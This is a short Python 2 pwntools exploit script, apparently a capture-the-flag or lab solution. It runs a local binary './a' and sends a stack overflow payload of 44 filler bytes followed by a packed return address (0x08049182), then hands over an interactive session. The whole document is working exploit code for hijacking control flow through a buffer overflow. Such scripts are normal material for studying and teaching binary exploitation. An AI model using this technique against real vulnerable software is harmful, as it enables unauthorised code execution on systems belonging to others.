#!/usr/bin/python2
from pwn import *

#  context.log_level = 'debug'

sh = process('./a')

payload = 'a' * 40 + 'bbbb' + p32(0x08049182)

sh.sendline(payload)

sh.interactive()
